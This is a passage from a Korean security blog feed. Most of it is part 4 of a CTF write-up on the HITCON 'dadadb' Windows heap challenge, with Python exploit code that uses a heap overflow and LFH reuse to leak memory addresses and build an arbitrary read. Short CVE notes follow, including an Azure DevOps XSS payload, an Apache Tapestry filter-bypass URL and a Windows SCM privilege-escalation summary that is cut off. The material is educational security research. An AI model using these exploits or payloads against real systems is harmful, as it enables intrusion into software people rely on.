class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span>* <span class="hljs-title">list</span>[256];</span></code></pre><p><code>main()</code>부터 살펴보겠습니다. <code>user.txt</code> 의 계정으로 로그인 쉘을 얻은 이후의 코드입니다.</p><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%205.png" alt="pwncoolsexy-part4/Untitled%205.png"></p><p>이중 새로운 node를 추가하는 <code>add_sub_1340()</code> 함수를 자세히 보겠습니다.</p><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%206.png" alt="pwncoolsexy-part4/Untitled%206.png"></p><p><code>add_sub_1340()</code>의 node를 추가하는 부분의 코드입니다.</p><ul><li><code>Key</code>를 입력받고 빨간 박스에서 현재 node list에 입력받은 <code>Key</code>값이 존재하는지 검색합니다.</li><li>만약 못 찾았다면 <code>LABEL_13</code>으로 점프해 새 node를 생성하고 찾았다면 아래 코드를 진행합니다.<ul><li>찾은 경우 linked list의 head에 새 node를 삽입합니다. (node[2] → node[1] → node[0]…)</li></ul></li></ul><p>입력받은 Key값이 이미 존재하는 경우를 좀 더 자세히 볼까요?</p><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%207.png" alt="pwncoolsexy-part4/Untitled%207.png"></p><ul><li>일치하는 <code>Key</code>값의 노드를 찾았으면 해당 <code>node→data</code>를 할당 해제하고 사이즈를 <code>new_size</code>에 새로 입력받습니다.</li><li><code>new_size</code>의 최댓값을 <code>0x1000</code>으로 제한합니다.</li><li><code>new_size</code>만큼 <code>node→data</code>에 새로 Heap을 할당합니다.</li><li><code>new_size</code>만큼 새로 할당한 <code>node→data</code>에 이전에 할당된 <code>node→data</code>의 사이즈인 <code>old_size</code>만큼 입력을 받습니다.<ul><li><code>new_size</code>가 <code>old_size</code>보다 작으면 Heap buffer overflow가 발생합니다.</li></ul></li></ul><h1 id="Leak-Address"><a href="#Leak-Address" class="headerlink" title="Leak Address"></a>Leak Address</h1><p>먼저 Heap overflow를 이용해 Heap 주소를 leak 해보겠습니다. 오늘은 LFH를 다룰 것이기 때문에 LFH가 활성화된 chunk에서 진행하도록 할게요.</p><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%208.png" alt="pwncoolsexy-part4/Untitled%208.png"></p><p>node를 추가하다 보면 19번째에서 LFH 플래그가 활성화됩니다. 이후 node를 세 개만 추가해서 어떤 위치에 할당되어있는지 확인해보겠습니다.</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> winpwn <span class="hljs-keyword">import</span> *<span class="hljs-comment">#...</span>p = process(<span class="hljs-string">&quot;./dadadb.exe&quot;</span>)login(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;&quot;</span>)<span class="hljs-comment">## enable LFH</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">18</span>):add(<span class="hljs-string">&quot;l0ch&quot;</span>+str(i),<span class="hljs-number">0x90</span>,<span class="hljs-string">&quot;BBBB&quot;</span>)<span class="hljs-comment">## fill userblock</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">3</span>):add(<span class="hljs-string">&quot;LFH&quot;</span>+str(i),<span class="hljs-number">0x90</span>,<span class="hljs-string">&quot;BBBB&quot;</span>)</code></pre><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%209.png" alt="pwncoolsexy-part4/Untitled%209.png"></p><p>LFH가 활성화된 chunk들이 무작위로 heap에 할당된 것을 볼 수 있습니다. 이렇게 무작위로 할당되어 chunk 간 거리가 불규칙하면 원하는 chunk에 접근하기 어려워집니다. 한마디로 원하는 heap layout을 구성하기 힘들어지죠. 따라서 일반적으로는 reliable 한 leak이 불가능.. 하지만! 방법이 있으니까 이런 삽질을 하는 거 아니겠어요?ㅎㅎ</p><h2 id="LFH-Reuse-Attack"><a href="#LFH-Reuse-Attack" class="headerlink" title="LFH Reuse Attack"></a>LFH Reuse Attack</h2><p>자 이제 전 파트에서 배운 <a href="https://hackyboiz.github.io/2021/03/28/l0ch/pwncoolsexy-part3/#Front-End-Exploitation">reuse attack</a>을 써먹을 차례입니다. 무작위 할당으로 할당될 chunk 위치를 예측하기 힘들다면? 그럼 다 채워버리고 한 곳만 남겨놔서 예측 가능하게 만들면 됩니다!</p><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2010.png" alt="pwncoolsexy-part4/Untitled%2010.png"></p><blockquote><p>선택지는 없다.</p></blockquote><p>그림으로 나타내면 아래와 같습니다. </p><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2011.png" alt="pwncoolsexy-part4/Untitled%2011.png"></p><ol><li>LFH chunk로 userblock을 모두 채웁니다. </li><li>임의의 chunk(여기서는 LFH5)를 해제하면 현재 userblock에는 빈 공간이 LFH5가 해제된 공간밖에 남아있지 않습니다.</li><li>add LFH4로 <code>LFH4→data</code>를 다시 할당하면 LFH는 해제된 chunk 우선으로 할당하게 되어 해제된 LFH5 공간에 새로 data를 할당합니다.  </li><li>3번의 과정에서 overflow 취약점이 있으니 이제 씹고 뜯고 맛보고 즐기기만 하면 됩니다!</li></ol><p>먼저 LFH chunk를 0~16까지 17개를 할당합니다. </p><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2012.png" alt="pwncoolsexy-part4/Untitled%2012.png"></p><p>랜덤 한 위치에 할당되어 순서는 뒤죽박죽이지만 옹기종기 예쁘게 모여있는 것이 보입니다. chunk17부터는 아래 사진과 같이 새 userblock에 할당되기 때문에 LFH chunk는 기존 userblock을 모두 채울 정도인 0~16까지 17개만 할당합니다. 이는 <code>ActiveSubsegment-&gt;AggregateExchg-&gt;Depth</code>를 참고해 해당 userblock에서 사용 가능한 block이 얼마나 되는지 확인해보면 됩니다.</p><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2013.png" alt="pwncoolsexy-part4/Untitled%2013.png"></p><p>이제 LFH5 chunk를 해제하고 add(LFH4)를 통해 해제후 재 할당된 <code>LFH4→data</code> 가 LFH5 chunk에 위치해 있는 것을 볼 수 있습니다. data에 입력한 <code>aaaaaaaa</code> 도 잘 들어가 있네요!</p><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2014.png" alt="pwncoolsexy-part4/Untitled%2014.png"></p><p>이제 <code>0x70</code>만큼 채우면 뒤의 heap address로 heap base address와 바로 뒤 chunk의 key까지 얻을 수 있습니다.</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> winpwn <span class="hljs-keyword">import</span> *<span class="hljs-comment">#...</span>context.log_level = <span class="hljs-string">&quot;debug&quot;</span>p = process(<span class="hljs-string">&quot;./dadadb.exe&quot;</span>)login(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;&quot;</span>)<span class="hljs-comment">## enable LFH</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">18</span>):add(<span class="hljs-string">&quot;l0ch&quot;</span>+str(i),<span class="hljs-number">0x90</span>,<span class="hljs-string">&quot;B&quot;</span>*<span class="hljs-number">0x90</span>)<span class="hljs-comment">## fill userblock</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">17</span>):add(<span class="hljs-string">&quot;LFH&quot;</span>+str(i),<span class="hljs-number">0x90</span>,<span class="hljs-string">&quot;B&quot;</span>*<span class="hljs-number">0x90</span>)delete(<span class="hljs-string">&quot;LFH5&quot;</span>)add(<span class="hljs-string">&quot;LFH4&quot;</span>,<span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x70</span>)view(<span class="hljs-string">&quot;LFH4&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x70</span>)heap_base = u64(p.recv(<span class="hljs-number">8</span>)) &amp; <span class="hljs-number">0xffffffffffff0000</span> p.recvuntil(p64(<span class="hljs-number">0x90</span>))key = p.recvuntil(<span class="hljs-string">&quot;\x00&quot;</span>)[:<span class="hljs-number">-1</span>]print(<span class="hljs-string">&quot;heap : &quot;</span>,hex(heap_base))print(<span class="hljs-string">&quot;key :&quot;</span>,key)</code></pre><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2015.png" alt="pwncoolsexy-part4/Untitled%2015.png"></p><p>바로 뒤에 있는 chunk의 key를 구했으니 overflow를 이용하면 leak 한 key의 <code>data</code> 포인터를 수정하면 arbitrary read가 가능하죠! 우리가 필요한 주소들은 다음과 같습니다.</p><ul><li>ntdll base: ROP gadget</li><li>image base</li><li>kernel32 base: <code>CreateFile()</code>, <code>ReadFile()</code>, <code>WriteFile()</code></li><li>PEB : <code>ProcessParameters</code>(stdin, stdout, stderr)</li><li>stack address</li></ul><h2 id="ntdll-base"><a href="#ntdll-base" class="headerlink" title="ntdll base"></a>ntdll base</h2><p><code>_HEAP-&gt;LockVariable-&gt;Lock</code> 은 <code>heap_base + 0x2c0</code> 에 위치해 있습니다. </p><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2016.png" alt="pwncoolsexy-part4/Untitled%2016.png"></p><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2017.png" alt="pwncoolsexy-part4/Untitled%2017.png"></p><p><code>Lock - 0x163d30</code> 로 ntdll의 base address를 구할 수 있습니다. (그리고 윈도우 업데이트 때문에 ntdll 버전이 바뀌어 <code>0x163dd0</code>으로 바뀌었다는 슬픈 사연이… 업데이트 미워)</p><pre><code class="hljs python"><span class="hljs-comment">#...</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">readmem</span>(<span class="hljs-params">key, addr</span>):</span>add(<span class="hljs-string">&quot;LFH4&quot;</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x70</span> + p64(addr))view(key)p.recvuntil(<span class="hljs-string">&quot;Data:&quot;</span>)<span class="hljs-keyword">return</span> u64(p.recv(<span class="hljs-number">8</span>))<span class="hljs-comment">#...</span>Lock = readmem(key, heap_base+<span class="hljs-number">0x2c0</span>)<span class="hljs-comment"># _HEAP-&gt;LockVariable-&gt;Lock</span>ntdll = Lock - <span class="hljs-number">0x163dd0</span> <span class="hljs-comment">#Lock - ntdll base address offset</span>print(hex(ntdll))</code></pre><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2018.png" alt="pwncoolsexy-part4/Untitled%2018.png"></p><h2 id="Imagebase"><a href="#Imagebase" class="headerlink" title="Imagebase"></a>Imagebase</h2><p>ntdll 주소를 구했으면 바이너리의 imagebase도 금방 구할 수 있습니다. 바로 <code>PebLdr</code> 을 이용해서 구하면 됩니다!</p><blockquote><p>PebLdr : 로드된 모듈들의 Double Linked List를 담고 있으며 <code>_PEB→Ldr</code>에서 참조한다.</p></blockquote><pre><code class="hljs angelscript"><span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; lm start             end                 module name...           <span class="hljs-number">00007f</span>fd`ea290000 <span class="hljs-number">00007f</span>fd`ea47d000   ntdll      (pdb symbols)    <span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; dt ntdll!_PEB @$peb Ldr   +<span class="hljs-number">0x018</span> Ldr : <span class="hljs-number">0x00007ffd</span>`ea3f53c0 _PEB_LDR_DATA<span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; dx -r1 ((ntdll!_PEB_LDR_DATA *)<span class="hljs-number">0x7ffdea3f53c0</span>)((ntdll!_PEB_LDR_DATA *)<span class="hljs-number">0x7ffdea3f53c0</span>)            : <span class="hljs-number">0x7ffdea3f53c0</span> [Type: _PEB_LDR_DATA *]    [+<span class="hljs-number">0x000</span>] Length           : <span class="hljs-number">0x58</span> [Type: unsigned long]    [+<span class="hljs-number">0x004</span>] Initialized      : <span class="hljs-number">0x1</span> [Type: unsigned char]    [+<span class="hljs-number">0x008</span>] SsHandle         : <span class="hljs-number">0x0</span> [Type: <span class="hljs-built_in">void</span> *]    [+<span class="hljs-number">0x010</span>] InLoadOrderModuleList [Type: _LIST_ENTRY]    [+<span class="hljs-number">0x020</span>] InMemoryOrderModuleList [Type: _LIST_ENTRY]...<span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; ? <span class="hljs-number">00007f</span>fd`ea3f53c0 - <span class="hljs-number">00007f</span>fd`ea290000Evaluate expression: <span class="hljs-number">1463232</span> = <span class="hljs-number">00000000</span>`<span class="hljs-number">001653</span>c0</code></pre><p><code>PebLdr</code> 은 <code>ntdll + 0x1653c0</code> 이 되겠네요. 그럼 <code>PebLdr</code>에서 문제 바이너리 dadadb를 찾아보겠습니다.</p><p>모듈이 로드되면 <code>ntdll!_PEB_LDR_DATA→InMemoryOrderModuleList(+0x20)</code> 에 먼저 로드된 순서대로 Double Linked List로 연결됩니다. 그럼 실행중인 바이너리도 당연히 올라와 있겠죠?</p><pre><code class="hljs angelscript"><span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; dx -r1 (*((ntdll!_LIST_ENTRY *)<span class="hljs-number">0x7ffdea3f53e0</span>))(*((ntdll!_LIST_ENTRY *)<span class="hljs-number">0x7ffdea3f53e0</span>))                 [Type: _LIST_ENTRY]    [+<span class="hljs-number">0x000</span>] Flink            : <span class="hljs-number">0x185b0702660</span> [Type: _LIST_ENTRY *]    [+<span class="hljs-number">0x008</span>] Blink            : <span class="hljs-number">0x185b0704020</span> [Type: _LIST_ENTRY *]<span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; dps <span class="hljs-number">0x185b0702660</span><span class="hljs-number">00000185</span>`b0702660  <span class="hljs-number">00000185</span>`b07024d0<span class="hljs-number">00000185</span>`b0702668  <span class="hljs-number">00007f</span>fd`ea3f53e0 ntdll!PebLdr+<span class="hljs-number">0x20</span><span class="hljs-number">00000185</span>`b0702670  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span><span class="hljs-number">00000185</span>`b0702678  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span><span class="hljs-number">00000185</span>`b0702680  <span class="hljs-number">00007f</span>f6`<span class="hljs-number">5f</span>1d0000 dadadb<span class="hljs-number">00000185</span>`b0702688  <span class="hljs-number">00007f</span>f6`<span class="hljs-number">5f</span>1d1eb0 dadadb+<span class="hljs-number">0x1eb0</span><span class="hljs-number">00000185</span>`b0702690  <span class="hljs-number">00000000</span>`<span class="hljs-number">00009000</span>...</code></pre><p>잘 올라와 있네요! </p><pre><code class="hljs python"><span class="hljs-comment">#...</span>pebldr = ntdll + <span class="hljs-number">0x1653c0</span>IMOML = readmem(key, pebldr+<span class="hljs-number">0x20</span>)print(<span class="hljs-string">&quot;InMemoryOrderModuleList: &quot;</span>,hex(IMOML))imagebase = readmem(key, IMOML+<span class="hljs-number">0x20</span>)print(<span class="hljs-string">&quot;imagebase :&quot;</span>,hex(imagebase))<span class="hljs-comment">#...</span></code></pre><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2019.png" alt="pwncoolsexy-part4/Untitled%2019.png"></p><h2 id="kernel32-base"><a href="#kernel32-base" class="headerlink" title="kernel32 base"></a>kernel32 base</h2><p>imagebase를 구했으니 kernel32 base address는 IAT 테이블을 이용해 쉽게 구할 수 있습니다. 자세한 방법은 제가 작년에 출제한 문제인 <a href="https://hackyboiz.github.io/2020/12/29/l0ch/address_book/#Exploit">Christmas CTF 2020 - addressbook</a> write-up에 설명되어 있습니다.</p><pre><code class="hljs angelscript"><span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; !dh <span class="hljs-number">00007f</span>f6`a72d0000...<span class="hljs-number">3000</span> [     <span class="hljs-number">230</span>] address [size] of Import Address Table Directory...<span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; lmstart             end                 module name...    <span class="hljs-number">00007f</span>fb`<span class="hljs-number">7</span>ea60000 <span class="hljs-number">00007f</span>fb`<span class="hljs-number">7</span>eb12000   KERNEL32   (pdb symbols) ...                <span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; dps <span class="hljs-number">00007f</span>f6`a72d0000 + <span class="hljs-number">3000</span> L230<span class="hljs-number">00007f</span>f6`a72d3000  <span class="hljs-number">00007f</span>fb`<span class="hljs-number">7</span>ea82460 KERNEL32!ReadFile<span class="hljs-number">00007f</span>f6`a72d3008  <span class="hljs-number">00007f</span>fb`<span class="hljs-number">7</span>ea7e7e0 KERNEL32!HeapCreateStub<span class="hljs-number">00007f</span>f6`a72d3010  <span class="hljs-number">00007f</span>fb`<span class="hljs-number">7</span>ea763a0 KERNEL32!HeapFreeStub<span class="hljs-number">00007f</span>f6`a72d3018  <span class="hljs-number">00007f</span>fb`<span class="hljs-number">7</span>ea7c660 KERNEL32!GetStdHandleStub<span class="hljs-number">00007f</span>f6`a72d3020  <span class="hljs-number">00007f</span>fb`<span class="hljs-number">7</span>ed7aa20 ntdll!RtlAllocateHeap<span class="hljs-number">00007f</span>f6`a72d3028  <span class="hljs-number">00007f</span>fb`<span class="hljs-number">7</span>ea7e970 KERNEL32!IsDebuggerPresentStub<span class="hljs-number">00007f</span>f6`a72d3030  <span class="hljs-number">00007f</span>fb`<span class="hljs-number">7</span>edb4410 ntdll!RtlInitializeSListHead...<span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; ? <span class="hljs-number">00007f</span>fb`<span class="hljs-number">7</span>ea82460 - <span class="hljs-number">00007f</span>fb`<span class="hljs-number">7</span>ea60000Evaluate expression: <span class="hljs-number">140384</span> = <span class="hljs-number">00000000</span>`<span class="hljs-number">00022460</span></code></pre><p><code>kernel32!ReadFile</code> 함수는 kernel32 base의 <code>0x22460</code>에 위치해 있습니다.</p><pre><code class="hljs python">kernel32 = readmem(key, imagebase+<span class="hljs-number">0x3000</span>) - <span class="hljs-number">0x22460</span>print(<span class="hljs-string">&quot;kernel32 :&quot;</span>,hex(kernel32))</code></pre><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2020.png" alt="pwncoolsexy-part4/Untitled%2020.png"></p><p>자 이제 거의 다왔습니다..!</p><h2 id="PEB-Stack-address"><a href="#PEB-Stack-address" class="headerlink" title="PEB/Stack address"></a>PEB/Stack address</h2><p><code>!address -summary</code> 로 PEB와 TEB, Stack주소를 확인할 수 있습니다.</p><pre><code class="hljs angelscript"><span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; !address -summary--- Largest Region by Usage ----------- Base Address -------- Region Size ----------Free                                    <span class="hljs-number">275</span>`<span class="hljs-number">1e0</span>c0000     <span class="hljs-number">7</span>b7f`<span class="hljs-number">3</span>dea0000 ( <span class="hljs-number">123.497</span> TB)MappedFile                             <span class="hljs-number">7</span>df5`<span class="hljs-number">5f</span>ec4000      <span class="hljs-number">1f</span>f`d6aed000 (   <span class="hljs-number">1.999</span> TB)&lt;unknown&gt;                              <span class="hljs-number">7</span>df4`<span class="hljs-number">5</span>c060000        <span class="hljs-number">1</span>`<span class="hljs-number">00020000</span> (   <span class="hljs-number">4.000</span> GB)Image                                  <span class="hljs-number">7f</span>fd`<span class="hljs-number">4</span>a817000        <span class="hljs-number">0</span>`<span class="hljs-number">00163000</span> (   <span class="hljs-number">1.387</span> MB)Stack                                    e4`<span class="hljs-number">4f</span>c00000        <span class="hljs-number">0</span>`<span class="hljs-number">000f</span>c000 (<span class="hljs-number">1008.000</span> kB)Heap                                    <span class="hljs-number">275</span>`<span class="hljs-number">1</span>dfce000        <span class="hljs-number">0</span>`<span class="hljs-number">000f</span>1000 ( <span class="hljs-number">964.000</span> kB)Other                                  <span class="hljs-number">7</span>df5`<span class="hljs-number">5e0</span>a0000        <span class="hljs-number">0</span>`<span class="hljs-number">00033000</span> ( <span class="hljs-number">204.000</span> kB)TEB                                      e4`<span class="hljs-number">4f</span>9ca000        <span class="hljs-number">0</span>`<span class="hljs-number">00002000</span> (   <span class="hljs-number">8.000</span> kB)PEB                                      e4`<span class="hljs-number">4f</span>9c9000        <span class="hljs-number">0</span>`<span class="hljs-number">00001000</span> (   <span class="hljs-number">4.000</span> kB)</code></pre><p>PEB는 ntdll의 bss 영역에 위치하며 PEB 주소는 아까 구한 <code>pebldr</code> 주소 근처에 있으니 뒤적뒤적거리며 찾다 보면 나옵니다 ㅎㅎ;</p><pre><code class="hljs angelscript"><span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; lmstart             end                 module name    ...    <span class="hljs-number">00007f</span>fd`<span class="hljs-number">4</span>d6a0000 <span class="hljs-number">00007f</span>fd`<span class="hljs-number">4</span>d890000   ntdll<span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; dt ntdll!_PEB @$peb Ldr   +<span class="hljs-number">0x018</span> Ldr : <span class="hljs-number">0x00007ffd</span>`<span class="hljs-number">4</span>d8053c0 _PEB_LDR_DATA<span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; dps <span class="hljs-number">0x00007ffd</span>`<span class="hljs-number">4</span>d8053c0  - <span class="hljs-number">100</span><span class="hljs-number">00007f</span>fd`<span class="hljs-number">4</span>d8052c0  ffffffff`ffffffff...<span class="hljs-number">00007f</span>fd`<span class="hljs-number">4</span>d805328  <span class="hljs-number">000000e4</span>`<span class="hljs-number">4f</span>9c9240<span class="hljs-number">00007f</span>fd`<span class="hljs-number">4</span>d805330  <span class="hljs-number">00000000</span>`<span class="hljs-number">00620026</span><span class="hljs-number">00007f</span>fd`<span class="hljs-number">4</span>d805338  <span class="hljs-number">00000275</span>`<span class="hljs-number">1</span>dfc2470</code></pre><p><code>PEB+0x240</code>은 <code>ntdll+0x165328</code>에 있으며 TEB는 <code>PEB + 0x1000</code>에, Stack address는 <code>TEB + 0x10</code>에 있으니 같이 구하겠습니다.</p><pre><code class="hljs python">peb = readmem(key, ntdll + <span class="hljs-number">0x165328</span>) - <span class="hljs-number">0x240</span>teb = peb + <span class="hljs-number">0x1000</span>stack = readmem(key, teb+<span class="hljs-number">0x10</span>)print(<span class="hljs-string">&quot;peb :&quot;</span>,hex(peb))print(<span class="hljs-string">&quot;teb :&quot;</span>,hex(teb))</code></pre><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2021.png" alt="pwncoolsexy-part4/Untitled%2021.png"></p><hr><p>드디어ㅓㅓㅓ 익스에 필요한 모든 정보를 구했습니다! </p><p>다음 파트에서는 본격적으로 exploit을 해보도록 하겠으며 전 그럼 이미 망한 중간고사 공부하러 20000..</p><h1 id="Part-5-예고"><a href="#Part-5-예고" class="headerlink" title="Part 5 예고"></a>Part 5 예고</h1><p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2022.png" alt="pwncoolsexy-part4/Untitled%2022.png"></p><blockquote><p>??? : 나만익스안돼나만익스안돼나만익스안돼   -2020 겨울, 크리스마스 CTF 문제 제작 중-</p></blockquote><p>과연 다음 글에서는 작년과 같은 참사 없이 익스에 성공해 Flag를 영접할 수 있을지…</p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>heap</tag>
      
      <tag>ctf</tag>
      
      <tag>L0ch</tag>
      
      <tag>research</tag>
      
      <tag>lfh</tag>
      
      <tag>nt heap</tag>
      
      <tag>hitcon</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-28459: Microsoft Azure DevOps Server Reflected XSS</title>
    <link href="/2021/04/17/fabu1ous/2021-04-17/"/>
    <url>/2021/04/17/fabu1ous/2021-04-17/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://packetstormsecurity.com/files/162190/SA-20210414-0.txt">CVE-2021-28459</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Microsoft Azure DevOps Server 2020.0.1</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Azure DevOps Server는 팀 단위의 소프트워어 개발 협업 툴입니다. 프로젝트 파일 업로드 권한을 갖는 해커는 프로젝트의 Collection Setting에 접근해 Reflected XSS 공격을 할 수 있습니다.</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">ProcessTemplate</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">metadata</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>XSS here: <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(document.URL)</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">description</span>&gt;</span>This template is flexible and will work great<span class="hljs-tag">&lt;/<span class="hljs-name">description</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;aa12a345-00a0-1f11-ba00-b12345b12345&quot;</span> <span class="hljs-attr">major</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">minor</span>=<span class="hljs-string">&quot;0&quot;</span> /&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span></code></pre><p>프로젝트 파일을 업로드할 권한이 있는 인증된 사용자는 Collection Setting &gt; Process에 <code>.zip</code>파일 형태로 프로세스 탬플릿을 업로드할 수 있습니다. 탬플릿 구조에 따르면 <code>ProcessTemplate.xml</code> 파일은 <code>&lt;name&gt;</code>을 포함해야 하는데 XSS 취약점이 있어 악용할 수 있습니다.</p><p>탬플릿 업로드 시 프로세스 템플릿이 변경되었다는 메세지를 띄우며 삽입된 JavaScript가 실행됩니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>xss</tag>
      
      <tag>microsoft</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-27850: Apache Tapestry CVE-2019-0195 Bypass </title>
    <link href="/2021/04/16/l0ch/2021-04-16/"/>
    <url>/2021/04/16/l0ch/2021-04-16/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://seclists.org/oss-sec/2021/q2/23">CVE-2021-27850: Apache Tapestry: Bypass of the fix for CVE-2019-0195</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Apache Tapestry 5.4.5, 5.5.0, 5.6.2 및 5.7.0 이전 버전</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>오픈소스 웹 프레임워크인 Apache Tapestry에서 발견된 원격 코드 실행 취약점 CVE-2019-0195 패치 우회의 세부 정보가 공개되었습니다.</p><p>CVE-2019-0195는 임의의 클래스 파일을 다운로드할 수 있어 해커가 이를 이용하면 serialized Java 객체 서명에 사용되는 <code>HMAC</code> 비밀 키를 알아낼 수 있습니다. 해커는 획득한 <code>HMAC</code> 비밀 키로 <code>CommonsBeanUtils1</code>과 같은 Java RCE gadget 체인에 서명할 수 있고 이는 원격 코드 실행으로 이어집니다.</p><p>위 취약점은 URL request에 <code>.class</code> , <code>.properties</code> , <code>.xml</code> 이 있는지 확인하고 이를 필터링하는 것으로 패치되었으나 payload URL의 끝에 <code>/</code> 를 추가하면 필터링을 간단하게 우회해 기존 취약점을 활용할 수 있는 것으로 확인되었습니다.</p><pre><code class="hljs cpp">http:<span class="hljs-comment">//[host ip]/assets/.../services/AppModule.class   -&gt; &quot;.class&quot; 필터링 적용됨 </span>http:<span class="hljs-comment">//[host ip]/assets/.../services/AppModule.class/  -&gt; &quot;.class&quot; 필터링 우회</span></code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>deserialization</tag>
      
      <tag>apache</tag>
      
      <tag>bypass</tag>
      
      <tag>L0ch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Windows SCM Remote Access Check Limit Bypass EoP</title>
    <link href="/2021/04/15/insu/2021-04-15/"/>
    <url>/2021/04/15/insu/2021-04-15/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2147">Issue 2147: Windows: SCM Remote Access Check Limit Bypass EoP</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows 10 20H2</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Windows 10 1709 이후 원격으로 local admin group이 아닌 원격 사용자가 <code>SCM</code> 및 <code>service access</code>에 접근 할 수 없도록 적용되었습니다.</p><p>사용자가 local 관리자 그룹에 없는 경우 <code>OpenSCManager</code> 또는 <code>OpenService</code>에 전달된 <code>Access mask</code>가 <code>0xD0072</code>에 대해 <code>ScAccessCheckAndAudit</code>에서 검사됩니다. 만약 access mask에 access 권한이 있으면 SCM이 <code>access denied error</code>와 함께 거절합니다. 이렇게 하면 원격 사용자가 <code>SERVICE_START</code> 혹은 <code>SC_MANAGER_CREATE_SERVICE</code>를 사용 할 수 없습니다.</p><p>하지만 원하는 access 권한은 RPC 호출에서 <code>NtAccessCheckAndAuditAlarm</code>으로 전달되고 access 권한은 <code>Service Handle</code>에 다시 기록됩니다.</p><p>따라서 이 검증은 <code>MAXIMUM_ALLOWED</code>를 request 